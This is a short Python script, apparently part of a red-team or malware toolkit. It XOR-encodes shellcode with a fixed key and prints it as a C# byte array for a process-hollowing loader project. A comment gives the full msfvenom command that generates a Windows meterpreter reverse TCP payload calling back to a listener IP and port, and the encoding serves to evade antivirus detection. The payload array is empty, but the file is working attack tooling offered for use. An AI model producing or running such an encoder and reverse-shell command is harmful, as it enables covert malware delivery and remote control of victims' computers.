#!/usr/bin/env python

# Put non-encoded C# payload below.
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.229.129 LPORT=2600 -f csharp
# Put only byte payload below
payload = []

def cspretty(buf_payload):
    """
    Take in list of hex bytes and make the appropriate format for C# code.
    """
    buf_len = str(len(buf_payload))
    print("\npublic static byte [] shellcode = new byte[%s] {%s};" % (buf_len, ",".join(buf_payload)))
    print("\n\n\t[+} Replace the shelcode buffer within Msfpayload.cs of hollow")

if __name__ == "__main__":
    xor_encoded_payload = []
    key = 0x42 # Ensure this key matches the hollow project.
    print("\t[+] Using key %s" % hex(key))
    for i in payload:
        xor_encoded_payload.append(hex(i ^ key))
    cspretty(xor_encoded_payload)
